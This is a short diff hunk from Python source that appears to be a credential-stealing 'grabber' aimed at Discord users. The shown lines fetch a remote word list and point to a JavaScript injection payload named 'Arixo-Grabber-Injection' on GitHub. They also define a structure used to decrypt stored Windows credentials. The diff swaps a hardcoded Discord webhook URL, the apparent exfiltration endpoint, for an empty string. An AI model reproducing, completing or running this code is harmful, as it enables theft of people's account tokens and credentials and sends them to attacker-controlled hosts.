@@ -114,7 +114,7 @@ words = "https://rentry.co/5uu99/raw"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
-h00k = "https://discord.com/api/webhooks/1120059208784695306/b5TN36_2jYASSKOZTkYYVnh428q3VZ2rbqHmH-hvBPWTIlRy1O03-EP_1upBl66MX7dt"
+h00k = ""
 inj3c710n_url = f"https://raw.githubusercontent.com/ArianPashae/Arixo-Grabber-Injection/master/injection-v1.js"
 
 class DATA_BLOB(Structure):
